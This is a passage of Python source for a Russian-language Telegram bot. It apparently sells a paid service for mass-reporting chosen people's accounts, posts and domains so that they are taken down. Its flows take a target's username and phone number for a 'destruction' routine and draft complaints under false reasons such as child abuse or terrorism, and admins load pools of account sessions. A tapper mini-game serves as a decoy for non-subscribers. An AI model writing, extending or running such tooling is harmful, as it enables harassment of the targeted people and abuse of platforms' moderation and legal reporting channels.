    await bot.send_message(chat_id, f"🇺🇸 <b>Итог TIDA:</b>\n✅ {success_count} | ❌ {fail_count}", parse_mode="HTML", reply_markup=subscriber_keyboard())

async def tida_queue_worker() -> None:
    while True:
        task_data = await tida_queue.get()
        async with tida_lock:
            try:
                await process_single_tida_task(task_data)
            except Exception:
                traceback.print_exc()
            finally:
                tida_queue.task_done()

def start_tida_worker_if_needed() -> None:
    global tida_worker_started
    if not tida_worker_started:
        asyncio.create_task(tida_queue_worker())
        tida_worker_started = True

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin:"))
async def admin_callbacks(call: Any) -> None:
    if call.from_user.id not in ADMIN_IDS:
        return
    parts = call.data.split(":")
    action = parts[1]
    if action == "broadcast":
        admin_flows[call.from_user.id] = AdminFlow(operator_id=call.from_user.id, action="broadcast")
        await bot.answer_callback_query(call.id)
        kb = bot_types.InlineKeyboardMarkup().add(bot_types.InlineKeyboardButton("❌ Отмена", callback_data="admin:cancel"))
        await bot.send_message(call.message.chat.id, "📢 Текст рассылки:", reply_markup=kb)
    elif action == "mandarins":
        admin_flows[call.from_user.id] = AdminFlow(operator_id=call.from_user.id, action="mandarins")
        await bot.answer_callback_query(call.id)
        kb = bot_types.InlineKeyboardMarkup().add(bot_types.InlineKeyboardButton("❌ Отмена", callback_data="admin:cancel"))
        await bot.send_message(call.message.chat.id, "🍊 Введите ID и количество: <code>123456789 5000</code>", parse_mode="HTML", reply_markup=kb)
    elif action == "destroy":
        user_flows[call.from_user.id] = UserFlow(operator_id=call.from_user.id, phase="awaiting_destroy_identity")
        await bot.answer_callback_query(call.id)
        kb = bot_types.InlineKeyboardMarkup().add(bot_types.InlineKeyboardButton("❌ Отмена", callback_data="admin:cancel"))
        await bot.send_message(call.message.chat.id, "🔥 Username или ID:", reply_markup=kb)
    elif action == "block":
        admin_flows[call.from_user.id] = AdminFlow(operator_id=call.from_user.id, action="block")
        await bot.answer_callback_query(call.id)
        kb = bot_types.InlineKeyboardMarkup().add(bot_types.InlineKeyboardButton("❌ Отмена", callback_data="admin:cancel"))
        await bot.send_message(call.message.chat.id, "🚫 ID для блокировки:", reply_markup=kb)
    elif action == "unblock":
        admin_flows[call.from_user.id] = AdminFlow(operator_id=call.from_user.id, action="unblock")
        await bot.answer_callback_query(call.id)
        kb = bot_types.InlineKeyboardMarkup().add(bot_types.InlineKeyboardButton("❌ Отмена", callback_data="admin:cancel"))
        await bot.send_message(call.message.chat.id, "✅ ID для разблокировки:", reply_markup=kb)
    elif action == "grant":
        admin_flows[call.from_user.id] = AdminFlow(operator_id=call.from_user.id, action="grant")
        await bot.answer_callback_query(call.id)
        kb = bot_types.InlineKeyboardMarkup().add(bot_types.InlineKeyboardButton("❌ Отмена", callback_data="admin:cancel"))
        await bot.send_message(call.message.chat.id, "🎁 ID и дни:", parse_mode="HTML", reply_markup=kb)
    elif action == "revoke":
        admin_flows[call.from_user.id] = AdminFlow(operator_id=call.from_user.id, action="revoke")
        await bot.answer_callback_query(call.id)
        kb = bot_types.InlineKeyboardMarkup().add(bot_types.InlineKeyboardButton("❌ Отмена", callback_data="admin:cancel"))
        await bot.send_message(call.message.chat.id, "❌ ID для аннулирования:", reply_markup=kb)
    elif action == "stats":
        await bot.answer_callback_query(call.id)
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, username, first_name, mandarins, level, expires_at, is_blocked, referred_count FROM users ORDER BY mandarins DESC LIMIT 50")
        users = cursor.fetchall()
        conn.close()
        text = "📊 <b>Пользователи:</b>\n\n"
        if not users:
            text += "😴 Нет пользователей."
        else:
            for idx, u in enumerate(users):
                status = "🚫" if u["is_blocked"] == 1 else "✅"
                name = u["username"] or u["first_name"] or f"ID{u['user_id']}"
                is_sub = "💎" if (u["expires_at"] == -1.0 or u["expires_at"] > time.time()) else "❌"
                league = get_league_icon(u["mandarins"])
                text += f"{idx+1}. {status}{is_sub}{league} @{name} (ID:{u['user_id']}) 🍊{int(u['mandarins']):,} Ур.{u['level']} 👥{u['referred_count']}\n"
        kb = bot_types.InlineKeyboardMarkup().add(bot_types.InlineKeyboardButton("⬅️ Назад", callback_data="admin:back"))
        await bot.send_message(call.message.chat.id, text, parse_mode="HTML", reply_markup=kb)
    elif action == "reload_sessions":
        u_count, d_count = load_sessions_from_folders()
        await bot.answer_callback_query(call.id, f"USA: {u_count} | Sessions: {d_count}", show_alert=True)
        await bot.send_message(call.message.chat.id, f"🔄 USA: <b>{u_count}</b> | Снос: <b>{d_count}</b>", parse_mode="HTML", reply_markup=admin_main_keyboard())
    elif action in ["back", "cancel"]:
        admin_flows.pop(call.from_user.id, None)
        user_flows.pop(call.from_user.id, None)
        await bot.answer_callback_query(call.id)
        await bot.send_message(call.message.chat.id, "👑 Админка:", reply_markup=admin_main_keyboard())

@bot.message_handler(content_types=["text"], func=lambda message: not message.text.startswith("/"))
async def text_input_dispatcher(message: Any) -> None:
    user = message.from_user
    if user.id not in ADMIN_IDS and not allowed_user(user):
        return
    
    admin_flow = admin_flows.get(user.id)
    if admin_flow and user.id in ADMIN_IDS:
        text = message.text.strip()
        action = admin_flow.action
        admin_flows.pop(user.id, None)
        if action == "broadcast":
            for u in db_get_all_users():
                try:
                    await bot.send_message(u["user_id"], text)
                except Exception:
                    pass
            await bot.send_message(message.chat.id, "✅ Рассылка завершена.", reply_markup=admin_main_keyboard())
            return
        elif action == "mandarins":
            parts = text.split()
            if len(parts) >= 2 and parts[0].isdigit() and parts[1].isdigit():
                target_id, amount = int(parts[0]), int(parts[1])
                db_upsert_user(target_id, "", "")
                conn = sqlite3.connect(DB_PATH)
                conn.cursor().execute("UPDATE users SET mandarins = mandarins + ? WHERE user_id = ?", (amount, target_id))
                conn.commit()
                conn.close()
                await bot.send_message(message.chat.id, f"✅ Начислено {amount} 🍊 → <code>{target_id}</code>", parse_mode="HTML", reply_markup=admin_main_keyboard())
                try:
                    await bot.send_message(target_id, f"🍊 Админ начислил вам <b>{amount}</b> мандаринов!", parse_mode="HTML")
                except Exception:
                    pass
            else:
                await bot.send_message(message.chat.id, "❌ Формат: <code>ID КОЛИЧЕСТВО</code>", parse_mode="HTML", reply_markup=admin_main_keyboard())
            return
        elif action == "block" and text.isdigit():
            db_toggle_block(int(text))
            await bot.send_message(message.chat.id, "✅ Статус изменён.", reply_markup=admin_main_keyboard())
            return
        elif action == "unblock" and text.isdigit():
            conn = sqlite3.connect(DB_PATH)
            conn.cursor().execute("UPDATE users SET is_blocked = 0 WHERE user_id = ?", (int(text),))
            conn.commit()
            conn.close()
            await bot.send_message(message.chat.id, "✅ Разблокировано.", reply_markup=admin_main_keyboard())
            return
        elif action == "grant":
            parts = text.split()
            if len(parts) >= 2 and parts[0].isdigit() and parts[1].lstrip('-').isdigit():
                db_set_subscription(int(parts[0]), int(parts[1]))
                await bot.send_message(message.chat.id, "✅ Подписка выдана.", reply_markup=admin_main_keyboard())
            return
        elif action == "revoke" and text.isdigit():
            conn = sqlite3.connect(DB_PATH)
            conn.cursor().execute("UPDATE users SET expires_at = 0 WHERE user_id = ?", (int(text),))
            conn.commit()
            conn.close()
            await bot.send_message(message.chat.id, "❌ Аннулировано.", reply_markup=admin_main_keyboard())
            return
    
    flow = user_flows.get(user.id)
    if flow and is_subscribed(user.id):
        text = message.text.strip()
        if is_protected_target(text):
            user_flows.pop(user.id, None)
            await bot.send_message(message.chat.id, "❌ <b>Цель защищена!</b>", parse_mode="HTML", reply_markup=subscriber_keyboard())
            return
        
        # DSA steps dispatcher
        if flow.phase == "dsa_awaiting_phone":
            flow.dsa_phone = text
            flow.phase = "dsa_awaiting_link"
            kb = bot_types.InlineKeyboardMarkup().add(bot_types.InlineKeyboardButton("❌ Отмена", callback_data="cancel"))
            await bot.send_message(message.chat.id,
                "📱 Номер принят.\n\n"
                "<b>Шаг 2:</b> Введите ссылку на публикацию/сообщение (прямой URL сообщения в публичном канале/чате):",
                parse_mode="HTML", reply_markup=kb)
            return
        elif flow.phase == "dsa_awaiting_link":
            if "@" in text and not "t.me/" in text:
                await bot.send_message(message.chat.id, "⚠️ Неверный формат! Нельзя использовать `@`, отправьте прямую ссылку на сообщение.")
                return
            flow.dsa_link = text
            flow.phase = "dsa_awaiting_reason_category"
            
            kb = bot_types.InlineKeyboardMarkup(row_width=1)
            kb.add(
                bot_types.InlineKeyboardButton("1) I don't like it", callback_data="dsa_rc:1"),
                bot_types.InlineKeyboardButton("2) Child abuse", callback_data="dsa_rc:2"),
                bot_types.InlineKeyboardButton("3) Violence", callback_data="dsa_rc:3"),
                bot_types.InlineKeyboardButton("4) Illegal goods", callback_data="dsa_rc:4"),
                bot_types.InlineKeyboardButton("5) Illegal adult content", callback_data="dsa_rc:5"),
                bot_types.InlineKeyboardButton("6) Personal data", callback_data="dsa_rc:6"),
                bot_types.InlineKeyboardButton("7) Terrorism", callback_data="dsa_rc:7"),
                bot_types.InlineKeyboardButton("8) Scam or spam", callback_data="dsa_rc:8"),
                bot_types.InlineKeyboardButton("9) Other", callback_data="dsa_rc:9"),
                bot_types.InlineKeyboardButton("10) It's not illegal, but it must be taken down", callback_data="dsa_rc:10"),
            )
            await bot.send_message(message.chat.id, "📌 <b>Шаг 3:</b> Выберите причину репорта:", parse_mode="HTML", reply_markup=kb)
            return
        elif flow.phase == "dsa_awaiting_explanation":
            if len(text) > 900:
                await bot.send_message(message.chat.id, "⚠️ Лимит превышен! Принимается до 900 символов.")
                return
            flow.dsa_explanation = text
            flow.phase = "dsa_awaiting_laws_links"
            
            kb = bot_types.InlineKeyboardMarkup(row_width=1)
            kb.add(
                bot_types.InlineKeyboardButton("The content is not illegal, but i want it removed", callback_data="dsa_laws:remove"),
                bot_types.InlineKeyboardButton("I don't have links to relevant laws", callback_data="dsa_laws:skip")
            )
            await bot.send_message(message.chat.id,
                "📜 <b>Шаг 4:</b> Введите ссылки на законы ИЛИ выберите опцию ниже:",
                parse_mode="HTML", reply_markup=kb)
            return
        elif flow.phase == "dsa_awaiting_laws_links":
            flow.dsa_laws_links = text
            flow.phase = "dsa_awaiting_country"
            
            kb = bot_types.InlineKeyboardMarkup(row_width=1)
            kb.add(
                bot_types.InlineKeyboardButton("🇪🇺 Подать как ЕС", callback_data="dsa_country:eu"),
                bot_types.InlineKeyboardButton("🌍 Подать как другую страну", callback_data="dsa_country:other")
            )
            await bot.send_message(message.chat.id, "🌍 <b>Шаг 5:</b> Выберите вариант подачи страны:", parse_mode="HTML", reply_markup=kb)
            return

        if flow.phase == "tida_awaiting_url":
            flow.tida_url = text
            flow.phase = "tida_awaiting_text"
            kb = bot_types.InlineKeyboardMarkup().add(bot_types.InlineKeyboardButton("❌ Отмена", callback_data="cancel"))
            await bot.send_message(message.chat.id, "<b>Шаг 2/2:</b> Текст жалобы:", parse_mode="HTML", reply_markup=kb)
            return
        elif flow.phase == "tida_awaiting_text":
            allowed, left_sec = check_cooldown(user.id)
            if not allowed:
                mins, secs = int(left_sec // 60), int(left_sec % 60)
                user_flows.pop(user.id, None)
                await bot.send_message(message.chat.id, f"⏳ Кулдаун! Подождите <b>{mins}м {secs}с</b>", parse_mode="HTML", reply_markup=subscriber_keyboard())
                return
            update_cooldown(user.id)
            flow.tida_text = text
            task_payload = {"chat_id": message.chat.id, "user_id": user.id, "username": user.username, "target_url": flow.tida_url, "user_text": text}
            user_flows.pop(user.id, None)
            start_tida_worker_if_needed()
            if tida_lock.locked() or not tida_queue.empty():
                queue_position = tida_queue.qsize() + 1
                await tida_queue.put(task_payload)
                await bot.send_message(message.chat.id, f"⚠️ TIDA занят. Вы в очереди <b>(позиция: {queue_position})</b>", parse_mode="HTML", reply_markup=subscriber_keyboard())
            else:
                await tida_queue.put(task_payload)
            return
        if flow.phase == "domain_awaiting_url":
            flow.domain_url = text
            flow.phase = "domain_awaiting_reason"
            kb = bot_types.InlineKeyboardMarkup().add(bot_types.InlineKeyboardButton("❌ Отмена", callback_data="cancel"))
            await bot.send_message(message.chat.id, "<b>Шаг 2/2:</b> Причина блокировки:", parse_mode="HTML", reply_markup=kb)
            return
        elif flow.phase == "domain_awaiting_reason":
            allowed, left_sec = check_cooldown(user.id)
            if not allowed:
                mins, secs = int(left_sec // 60), int(left_sec % 60)
                user_flows.pop(user.id, None)
                await bot.send_message(message.chat.id, f"⏳ Кулдаун! <b>{mins}м {secs}с</b>", parse_mode="HTML", reply_markup=subscriber_keyboard())
                return
            update_cooldown(user.id)
            flow.domain_reason = text
            user_flows.pop(user.id, None)
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute("INSERT INTO domain_cases (user_id, username, url, reason) VALUES (?, ?, ?, ?)", (user.id, user.username, flow.domain_url, text))
            case_id = cursor.lastrowid
            conn.commit()
            conn.close()
            await bot.send_message(message.chat.id, f"✅ Заявка №{case_id} отправлена!", parse_mode="HTML", reply_markup=subscriber_keyboard())
            return
        if flow.phase == "awaiting_destroy_identity":
            if text.lower().startswith("id"):
                cleaned_id = re.sub(r"[^\d]", "", text)
                if not cleaned_id:
                    await bot.send_message(message.chat.id, "⚠️ Введите цифры ID:")
                    return
                flow.target_identity = f"id{cleaned_id}"
            elif text.startswith("@"):
                flow.target_identity = text
            elif text.isdigit():
                flow.target_identity = f"id{text}"
            else:
                await bot.send_message(message.chat.id, "⚠️ Неверный формат!")
                return
            flow.phase = "awaiting_destroy_phone"
            kb = bot_types.InlineKeyboardMarkup().add(bot_types.InlineKeyboardButton("❌ Отмена", callback_data="cancel"))
            await bot.send_message(message.chat.id, f"✅ Принято: <code>{flow.target_identity}</code>\n\n<b>Шаг 2/2:</b> Телефон:", parse_mode="HTML", reply_markup=kb)
            return
        elif flow.phase == "awaiting_destroy_phone":
            allowed, left_sec = check_cooldown(user.id)
            if not allowed:
                mins, secs = int(left_sec // 60), int(left_sec % 60)
                user_flows.pop(user.id, None)
                await bot.send_message(message.chat.id, f"⏳ Кулдаун! <b>{mins}м {secs}с</b>", parse_mode="HTML", reply_markup=subscriber_keyboard())
                return
            if not re.search(r"\d{7,}", text):
                await bot.send_message(message.chat.id, "⚠️ Корректный номер!")
                return
            update_cooldown(user.id)
            identity, phone = flow.target_identity, text
            user_flows.pop(user.id, None)
            await execute_hellish_destruction(message.chat.id, user.id, user.username, identity, phone)
            return
    
    if not is_subscribed(user.id):
        await send_mandarin_decoy(message.chat.id)
    else:
        await bot.send_message(message.chat.id, "⚡️ Используйте меню.", reply_markup=subscriber_keyboard())

@bot.callback_query_handler(func=lambda call: call.data == "cancel")
async def cancel_callback(call: Any) -> None:
    user = call.from_user
    user_flows.pop(user.id, None)
    admin_flows.pop(user.id, None)
    await bot.answer_callback_query(call.id)
    if is_subscribed(user.id):
        await bot.send_message(call.message.chat.id, "❌ Отменено.", reply_markup=subscriber_keyboard())
    else:
        await send_mandarin_decoy(call.message.chat.id)


# ==================== MINI APP API ====================
# Server-authoritative game API. The bot/database remain the source of truth.
HIDDEN_USER_ID = 6589732981
HIDDEN_USERNAME = "kllscmr"
GAME_TAP_BATCH_MAX = 20
GAME_MAX_OFFLINE_SECONDS = 86400

LEVEL_CONFIG = {
    1: {"regen": 10, "bonus": 0, "cost": 0, "label": "🌱 Садовод"},
    2: {"regen": 13, "bonus": 1, "cost": 1000, "label": "🌿 Фермер"},
    3: {"regen": 17, "bonus": 2, "cost": 3000, "label": "🌳 Агроном"},
    4: {"regen": 22, "bonus": 3, "cost": 8000, "label": "🍊 Барон"},
    5: {"regen": 28, "bonus": 4, "cost": 15000, "label": "👑 Граф"},
    6: {"regen": 35, "bonus": 6, "cost": 30000, "label": "🏰 Князь"},
    7: {"regen": 43, "bonus": 8, "cost": 60000, "label": "⚜️ Герцог"},
    8: {"regen": 52, "bonus": 10, "cost": 100000, "label": "👑 Король"},
    9: {"regen": 62, "bonus": 15, "cost": 200000, "label": "🌟 Император"},
    10: {"regen": 80, "bonus": 20, "cost": 999999999, "label": "🍊 Мандариновый Бог"},
}


def hidden_user(row: dict | None) -> bool:
    if not row:
        return False
    return int(row.get("user_id", 0)) == HIDDEN_USER_ID or (row.get("username") or "").lower() == HIDDEN_USERNAME


def db_migrate_game() -> None:
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    migrations = [
        ("energy", "REAL DEFAULT 1000"),
        ("last_energy_time", "REAL DEFAULT 0"),
        ("last_game_time", "REAL DEFAULT 0"),
        ("updated_at", "REAL DEFAULT 0"),
        ("combo", "INTEGER DEFAULT 0"),
        ("last_tap_time", "REAL DEFAULT 0"),
    ]
    for name, definition in migrations:
        try:
            cur.execute(f"ALTER TABLE users ADD COLUMN {name} {definition}")
        except sqlite3.OperationalError:
            pass
    cur.execute("UPDATE users SET energy = COALESCE(energy, max_energy), last_energy_time = CASE WHEN last_energy_time=0 THEN COALESCE(last_seen, ?) ELSE last_energy_time END, last_game_time = CASE WHEN last_game_time=0 THEN COALESCE(last_seen, ?) ELSE last_game_time END", (time.time(), time.time()))
    conn.commit(); conn.close()


db_migrate_game()


def game_level_up(cur, row):
    level = int(row["level"] or 1)
    mandarins = float(row["mandarins"] or 0)
    while level < 10:
        nxt = LEVEL_CONFIG[level + 1]
        if mandarins < nxt["cost"]:
            break
        level += 1
    if level != int(row["level"] or 1):
        cur.execute("UPDATE users SET level=? WHERE user_id=?", (level, row["user_id"]))
    return level


def apply_server_time(cur, row):
    now = time.time()
    last_game = float(row.get("last_game_time") or row.get("last_seen") or now)
    elapsed = max(0.0, min(GAME_MAX_OFFLINE_SECONDS, now - last_game))
    income = float(row.get("income") or 0)
    clan_mult = 1.10 if row.get("clan_name") else 1.0
    if elapsed > 0 and income > 0:
        cur.execute("UPDATE users SET mandarins = mandarins + ? WHERE user_id=?", (income * elapsed * clan_mult, row["user_id"]))
    energy = float(row.get("energy") if row.get("energy") is not None else row.get("max_energy", 1000))
    max_energy = int(row.get("max_energy") or 1000)
    regen = LEVEL_CONFIG.get(int(row.get("level") or 1), LEVEL_CONFIG[1])["regen"]
    energy = min(max_energy, energy + regen * elapsed)
    cur.execute("UPDATE users SET energy=?, last_energy_time=?, last_game_time=?, last_seen=?, updated_at=? WHERE user_id=?", (energy, now, now, now, now, row["user_id"]))


def game_row(user_id: int):
    conn=sqlite3.connect(DB_PATH); conn.row_factory=sqlite3.Row
    cur=conn.cursor(); cur.execute("SELECT * FROM users WHERE user_id=?", (user_id,)); row=cur.fetchone()
    if row:
        apply_server_time(cur, dict(row)); conn.commit(); cur.execute("SELECT * FROM users WHERE user_id=?", (user_id,)); row=cur.fetchone()
    conn.close(); return dict(row) if row else None


def validate_init_data(init_data: str):
    if not init_data:
        raise ValueError("missing initData")
    pairs=dict(parse_qsl(init_data, keep_blank_values=True))
    received=pairs.pop("hash", "")
    if not received:
        raise ValueError("missing hash")
    auth_date=int(pairs.get("auth_date", "0"))
    if not auth_date or time.time()-auth_date>86400:
        raise ValueError("expired initData")
    check="\n".join(f"{k}={pairs[k]}" for k in sorted(pairs))
    secret=hmac.new(b"WebAppData", BOT_TOKEN.encode(), hashlib.sha256).digest()
    calculated=hmac.new(secret, check.encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(calculated, received):
        raise ValueError("invalid initData")
    user=json.loads(pairs.get("user", "{}"))
    if not user.get("id"):
        raise ValueError("missing user")
    return user


def api_payload(row: dict):
    hidden=hidden_user(row)
    level=int(row.get("level") or 1)
    cfg=LEVEL_CONFIG.get(level, LEVEL_CONFIG[1])
    conn=sqlite3.connect(DB_PATH); conn.row_factory=sqlite3.Row; cur=conn.cursor()
    cur.execute("SELECT achievement_id FROM user_achievements WHERE user_id=?", (row["user_id"],)); achievements=[r[0] for r in cur.fetchall()]
    cur.execute("SELECT quest_id FROM quest_progress WHERE user_id=? AND claimed=1", (row["user_id"],)); claimed_quests=[r[0] for r in cur.fetchall()]
    conn.close()
    return {
        "user": {"id": row["user_id"], "username": None if hidden else row.get("username"), "first_name": "АНОНИМ" if hidden else (row.get("first_name") or "Игрок"), "hidden": hidden},
        "game": {"mandarins": int(row.get("mandarins") or 0), "energy": int(row.get("energy") or row.get("max_energy") or 1000), "max_energy": int(row.get("max_energy") or 1000), "click_power": int(row.get("click_power") or 1), "income": int(row.get("income") or 0), "level": level, "level_label": cfg["label"], "total_taps": int(row.get("total_taps") or 0), "p1": int(row.get("p1_count") or 0), "p2": int(row.get("p2_count") or 0), "cases_today": int(row.get("cases_opened_today") or 0), "cases_total": int(row.get("cases_total") or 0), "clan": row.get("clan_name") or "", "daily_streak": int(row.get("daily_streak") or 0), "last_daily": float(row.get("last_daily") or 0), "referred_count": int(row.get("referred_count") or 0), "achievements": achievements, "claimed_quests": claimed_quests}
    }


def api_json(data, status=200):
    return aiohttp.web.json_response(data, status=status, headers={"Cache-Control":"no-store", "Access-Control-Allow-Origin":"*", "Access-Control-Allow-Headers":"Content-Type, X-Telegram-Init-Data", "Access-Control-Allow-Methods":"GET,POST,OPTIONS"})


def api_user(request):
    init_data=request.headers.get("X-Telegram-Init-Data", "")
    return validate_init_data(init_data)


async def api_options(request): return api_json({}, 204)

async def api_bootstrap(request):
    try:
        u=api_user(request); db_upsert_user(int(u["id"]), u.get("username", ""), u.get("first_name", ""))
        row=game_row(int(u["id"]))
        if not row: return api_json({"error":"user_not_found"},404)
        return api_json({"ok":True, **api_payload(row), "leaderboard": await build_leaderboard(int(u["id"]))})
    except Exception as e: return api_json({"error":str(e)},401)

async def build_leaderboard(me_id=0, limit=50):
    conn=sqlite3.connect(DB_PATH); conn.row_factory=sqlite3.Row; cur=conn.cursor()
    cur.execute("SELECT user_id,username,first_name,level,mandarins FROM users WHERE mandarins>0 AND is_blocked=0 AND user_id!=? AND (username IS NULL OR lower(username)!=?) ORDER BY mandarins DESC LIMIT ?", (HIDDEN_USER_ID,HIDDEN_USERNAME,limit))
    rows=[dict(r) for r in cur.fetchall()]
    cur.execute("SELECT COUNT(*)+1 FROM users WHERE mandarins>(SELECT mandarins FROM users WHERE user_id=?) AND is_blocked=0 AND user_id!=? AND (username IS NULL OR lower(username)!=?)", (me_id,HIDDEN_USER_ID,HIDDEN_USERNAME))
    rank=int(cur.fetchone()[0] or 1) if me_id else None
    conn.close()
    result=[]
    for i,r in enumerate(rows,1): result.append({"rank":i,"username":r.get("username") or r.get("first_name") or "Игрок","level":int(r.get("level") or 1),"mandarins":int(r.get("mandarins") or 0)})
    return {"items":result,"my_rank":None if me_id==HIDDEN_USER_ID else rank}

async def api_leaderboard(request):
    try:
        u=api_user(request); return api_json({"ok":True, "leaderboard":await build_leaderboard(int(u["id"]))})
    except Exception as e: return api_json({"error":str(e)},401)

async def api_tap(request):
    try:
        u=api_user(request); uid=int(u["id"]); body=await request.json(); count=max(1,min(GAME_TAP_BATCH_MAX,int(body.get("count",1))))
        conn=sqlite3.connect(DB_PATH); conn.row_factory=sqlite3.Row; cur=conn.cursor(); cur.execute("SELECT * FROM users WHERE user_id=?",(uid,)); row=cur.fetchone()
        if not row: db_upsert_user(uid,u.get("username",""),u.get("first_name","")); cur.execute("SELECT * FROM users WHERE user_id=?",(uid,)); row=cur.fetchone()
        d=dict(row); apply_server_time(cur,d); cur.execute("SELECT * FROM users WHERE user_id=?",(uid,)); d=dict(cur.fetchone())
        power=max(1,int(d.get("click_power") or 1)); energy=float(d.get("energy") or 0); allowed=min(count,int(energy//power))
        if allowed<=0: conn.commit(); conn.close(); return api_json({"ok":True,"gained":0,"reason":"energy","game":api_payload(d)["game"]})
        now=time.time(); old_taps=int(d.get("total_taps") or 0); gain=power*allowed
        crits=0
        for _ in range(allowed):
            if random.random()<min(.08, (int(d.get("combo") or 0)+1)/500): gain += power; crits += 1
        combo=int(d.get("combo") or 0)+1 if now-float(d.get("last_tap_time") or 0)<0.9 else 1
        energy-=allowed*power
        cur.execute("UPDATE users SET mandarins=mandarins+?, energy=?, total_taps=total_taps+?, combo=?, last_tap_time=?, last_game_time=?, last_seen=?, updated_at=? WHERE user_id=?",(gain,energy,allowed,combo,now,now,now,now,uid))
        conn.commit(); cur.execute("SELECT * FROM users WHERE user_id=?",(uid,)); d=dict(cur.fetchone()); game_level_up(cur,d); conn.commit(); cur.execute("SELECT * FROM users WHERE user_id=?",(uid,)); d=dict(cur.fetchone()); conn.close()
        check_achievements(uid,d); check_quests(uid,d)
        return api_json({"ok":True,"gained":int(gain),"taps":allowed,"crits":crits,"combo":combo,"game":api_payload(d)["game"]})
    except Exception as e: return api_json({"error":str(e)},400)

async def api_buy(request):
    try:
        u=api_user(request); uid=int(u["id"]); body=await request.json(); item=str(body.get("item",""))
        conn=sqlite3.connect(DB_PATH); conn.row_factory=sqlite3.Row; cur=conn.cursor(); cur.execute("SELECT * FROM users WHERE user_id=?",(uid,)); row=cur.fetchone()
        if not row: return api_json({"error":"user_not_found"},404)
        d=dict(row); apply_server_time(cur,d); cur.execute("SELECT * FROM users WHERE user_id=?",(uid,)); d=dict(cur.fetchone()); bal=float(d["mandarins"])
        if item=="p1": cost=int(d.get("p1_count") or 0); cost=int(50*(1.4**cost)); sql=("p1_count=p1_count+1,income=income+1",)
        elif item=="p2": cost=int(300*(1.45**int(d.get("p2_count") or 0))); sql=("p2_count=p2_count+1,income=income+5",)
        elif item=="p3": cost=int(100*(1.5**max(0,int(d.get("click_power") or 1)-1))); sql=("click_power=click_power+1",)
        elif item=="energy":
            if int(d.get("level") or 1)<2 or int(d.get("max_energy") or 1000)>=2000: return api_json({"error":"energy_upgrade_unavailable"},400)
            cost=5000; sql=("max_energy=2000,energy=2000",)
        elif item=="level":
            lvl=int(d.get("level") or 1); nxt=LEVEL_CONFIG.get(lvl+1)
            if not nxt:return api_json({"error":"max_level"},400)
            cost=nxt["cost"]; sql=("level=level+1,click_power=click_power+?", nxt["bonus"])
        else:return api_json({"error":"unknown_item"},400)
        if bal<cost:return api_json({"error":"not_enough_mandarins","cost":cost},400)
        if len(sql)==1: cur.execute(f"UPDATE users SET mandarins=mandarins-?,{sql[0]} WHERE user_id=?",(cost,uid))
        else: cur.execute(f"UPDATE users SET mandarins=mandarins-?,{sql[0]} WHERE user_id=?",(cost,sql[1],uid))
        conn.commit(); cur.execute("SELECT * FROM users WHERE user_id=?",(uid,)); d=dict(cur.fetchone()); conn.close(); check_achievements(uid,d); check_quests(uid,d)
        return api_json({"ok":True,"game":api_payload(d)["game"]})
    except Exception as e:return api_json({"error":str(e)},400)

async def api_clan_create(request):
    try:
        u=api_user(request); uid=int(u["id"]); body=await request.json(); name=str(body.get("name") or f"🍊 Клан {u.get('username') or u.get('first_name') or uid}").strip()[:32]
        if not name: return api_json({"error":"invalid_name"},400)
        conn=sqlite3.connect(DB_PATH); conn.row_factory=sqlite3.Row; cur=conn.cursor(); cur.execute("SELECT * FROM users WHERE user_id=?",(uid,)); row=cur.fetchone()
        if not row: conn.close(); return api_json({"error":"user_not_found"},404)
        d=dict(row); apply_server_time(cur,d); cur.execute("SELECT * FROM users WHERE user_id=?",(uid,)); d=dict(cur.fetchone())
        if d.get("clan_name"): conn.close(); return api_json({"error":"already_in_clan"},400)
        if float(d.get("mandarins") or 0)<30000: conn.close(); return api_json({"error":"not_enough_mandarins"},400)
        cur.execute("UPDATE users SET mandarins=mandarins-30000, clan_name=? WHERE user_id=?",(name,uid)); conn.commit(); cur.execute("SELECT * FROM users WHERE user_id=?",(uid,)); d=dict(cur.fetchone()); conn.close(); check_achievements(uid,d); return api_json({"ok":True,"game":api_payload(d)["game"]})
    except Exception as e:return api_json({"error":str(e)},400)

async def api_case(request):
    try:
        u=api_user(request); uid=int(u["id"]); can_open,rem=check_case_limit(uid)
        if not can_open:return api_json({"error":"case_limit"},400)
        conn=sqlite3.connect(DB_PATH); conn.row_factory=sqlite3.Row; cur=conn.cursor(); cur.execute("SELECT * FROM users WHERE user_id=?",(uid,)); d=dict(cur.fetchone())
        apply_server_time(cur,d); cur.execute("SELECT * FROM users WHERE user_id=?",(uid,)); d=dict(cur.fetchone())
        if float(d["mandarins"])<10000: conn.close(); return api_json({"error":"not_enough_mandarins"},400)
        now=time.time(); cur.execute("UPDATE users SET mandarins=mandarins-10000 WHERE user_id=?",(uid)); conn.commit(); conn.close(); increment_case_count(uid)
        r=random.random()
        if r<.01: prize=random.randint(15000,25000); db_set_subscription(uid,1); msg=f"🎉 ДЖЕКПОТ · +{prize:,} 🍊 · +1 день подписки"
        elif r<.15: prize=random.randint(5000,9000); msg=f"⭐ Супер · +{prize:,} 🍊"
        else: prize=random.randint(800,3300); msg=f"📦 Награда · +{prize:,} 🍊"
        conn=sqlite3.connect(DB_PATH); conn.execute("UPDATE users SET mandarins=mandarins+? WHERE user_id=?",(prize,uid)); conn.commit(); conn.close(); d=game_row(uid); check_achievements(uid,d); return api_json({"ok":True,"prize":prize,"message":msg,"game":api_payload(d)["game"]})
    except Exception as e:return api_json({"error":str(e)},400)

async def api_daily(request):
    try:
        u=api_user(request); uid=int(u["id"]); d=game_row(uid); now=time.time(); last=float(d.get("last_daily") or 0); streak=int(d.get("daily_streak") or 0)
        if now-last<86400:return api_json({"error":"daily_claimed","next":last+86400},400)
        if now-last>172800:streak=0
        streak+=1; reward={1:100,2:200,3:500,4:700,5:1000,6:1500,7:2000}.get(min(streak,7),2000)
        conn=sqlite3.connect(DB_PATH); conn.execute("UPDATE users SET mandarins=mandarins+?,daily_streak=?,last_daily=? WHERE user_id=?",(reward,streak,now,uid));conn.commit();conn.close();d=game_row(uid);return api_json({"ok":True,"reward":reward,"streak":streak,"game":api_payload(d)["game"]})
    except Exception as e:return api_json({"error":str(e)},400)

async def api_quest(request):
    try:
        u=api_user(request); uid=int(u["id"]); body=await request.json(); qid=str(body.get("quest_id",""));
